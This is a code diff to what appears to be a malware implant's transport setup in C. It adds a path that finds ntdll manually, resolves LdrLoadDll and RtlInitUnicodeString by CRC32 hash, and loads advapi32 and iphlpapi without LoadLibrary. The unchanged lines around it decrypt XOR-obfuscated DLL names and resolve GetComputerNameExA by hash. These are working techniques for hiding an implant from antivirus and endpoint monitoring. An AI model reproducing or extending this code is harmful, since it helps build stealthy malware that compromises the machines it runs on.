@@ -71,8 +71,43 @@ BOOL TransportInit( ) {
     ROL_AND_DECRYPT((const char *)s_iphlpapi, sizeof(s_iphlpapi), 1, d_iphlpapi, (const char *)s_xkey);
 
     HANDLE p_kernel32 = LocalGetModuleHandle(d_kernel32);
+
+#if CONFIG_NATIVE == TRUE
+
+#if CONFIG_ARCH == 64
+    void *p_ntdll = get_ntdll_64();
+#else
+    void *p_ntdll = get_ntdll_32();
+#endif //CONFIG_ARCH
+    NTSTATUS status;
+    UNICODE_STRING usAdvapi32;
+    UNICODE_STRING usIphlpapi;
+
+    PWCHAR pwcAdvapi32 = str_to_wide(d_advapi32);
+    PWCHAR pwcIphlpapi = str_to_wide(d_iphlpapi);
+
+    LdrLoadDll_t p_LdrLoadDll = GetProcAddressByHash(p_ntdll, LdrLoadDll_CRC32B);
+    RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(p_ntdll, RtlInitUnicodeString_CRC32B);
+
+    p_RtlInitUnicodeString(&usAdvapi32, pwcAdvapi32);
+    p_RtlInitUnicodeString(&usIphlpapi, pwcIphlpapi);
+
+    PVOID p_advapi32 = NULL;
+    PVOID p_iphlpapi = NULL;
+
+    if((status = p_LdrLoadDll(NULL, NULL, &usAdvapi32, &p_advapi32)) != 0x0){
+        return -1;
+    }
+
+    if((status = p_LdrLoadDll(NULL, NULL, &usIphlpapi, &p_iphlpapi)) != 0x0){
+        return -1;
+    }
+
+
+#else
     HANDLE p_advapi32 = LoadLibrary(d_advapi32);
     HANDLE p_iphlpapi = LoadLibrary(d_iphlpapi);
+#endif
 
     GetComputerNameExA_t p_GetComputerNameExA = (GetComputerNameExA_t) GetProcAddressByHash(p_kernel32,
                                                                                             GetComputerNameExA_CRC32B);
